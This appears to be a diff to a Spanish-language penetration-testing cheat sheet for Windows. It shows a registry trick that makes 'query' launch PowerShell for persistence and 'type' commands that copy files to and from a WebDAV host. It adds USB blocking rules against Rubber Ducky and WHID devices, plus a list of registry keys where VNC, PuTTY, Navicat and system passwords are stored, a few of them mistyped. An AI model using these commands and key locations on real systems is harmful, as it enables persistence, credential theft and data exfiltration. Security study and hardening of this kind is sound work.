@@ -57,7 +57,7 @@ debugfs: cat /etc/passwd
 | http://192.168.0.5 | http://192.168.5 |
 
 ### Post-Explotación 
-LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager)
+LPE (Local Privilege Escalation) persistente y sin uso de archivos usando sc.exe otorgando permisos del SCM (Service Control Manager).
 
 - https://learn.microsoft.com/en-us/windows/win32/services/service-control-manager
 
@@ -102,7 +102,7 @@ Un actor malicioso puede crear en una nueva línea de comandos en Powershell con
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Utilities\query" /v pwned /t REG_MULTI_SZ /d 0\01\0pwned\0powershell.exe
 ```
 
-Al consultar la rama del registro se ejecutará una Powershell.exe
+Al consultar la rama del registro se ejecutará una Powershell.exe.
 ```cmd
 query hacker
 ```
@@ -120,3 +120,61 @@ type \\webdav-ip\path\file.ext > C:\path\file.ext
 ```cmd
 type C:\path\file.ext > \\webdav-ip\path\file.ext
 ```
+
+### Bloquear conexiones USB: Rubber Ducky y Cactus WHID.
+
+- HID - Hardware ID 
+- VID - Vendor ID
+- PID - Product ID
+
+**Rubber Ducky**.
+```
+HID\VID_03EB&PID_2401&REV_0100
+```
+
+**Cactus WHID** (whid-injector).
+```
+HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02
+HID\VID_1B4F&PID_9208&MI_02&Col02
+```
+
+```ps
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDs' -Value 1 -PropertyType DWord
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions" -Name 'DenyDeviceIDsRetroactive' -Value 1 -PropertyType DWord
+
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_03EB&PID_2401&REV_0100' -Value 1 -PropertyType String
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&MI_02&Col02' -Value 1 -PropertyType String
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions\DenyDeviceIDs" -Name 'HID\VID_1B4F&PID_9208&REV_0100&MI_02&Col02' -Value 1 -PropertyType String
+```
+
+### Claves de registro de Windows donde se almacenan las contraseñas
+
+Claves de registro de Windows donde se almacenan las contraseñas del sistema y de herramientas de terceros más comunes, buscadas en fases de Post-Explotación. 
+
+Las claves se ordenan de mayor a menor ocurrencia.
+```
+KLM\Software\RealVNC\WinVNC4
+HKCU\Software\SimonTatham\PuTTY\Sessions
+HKCU\Software\ORL\WinVNC3\Password
+HKLM\SYSTEM\Current\ControlSet\Services\SNMP
+HKCU\Software\Polices\Microsoft\Windows\Installer
+HKLM\SYSTEM\CurrentControlSet\Services\SNMP
+HKCU\Software\TightVNC\Server
+HKCU\Software\OpenSSH\Agent\Keys
+HKLM\SYSTEM\CurrentControlSet\Control\LSA
+HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential
+HKLM\Software\RealVNC\vncserver
+HKLM\Software\RealVNC\WinVNC4\Password
+HKLM\Software\RealVNC
+HKCU\Software\PremiumSoft\Navicat\Servers
+HKLM\SYSTEM
+HKLM\SAM
+HKCU\Software\PremiumSoft\NavicatMONGODB\Servers
+HKCU\Software\PremiumSoft\NavicatMSSQL\Servers
+HKCU\Software\PremiumSoft\NavicatPG\Servers
+HKCU\Software\PremiumSoft\NavicatSQLite\Servers
+HKCU\Software\PremiumSoft\NavicatMARIADB\Servers
+HKCU\Software\PremiumSoft\NavicatOra\Servers
+HKCU\Software\TigerVNC\WinVNC4
+```
+
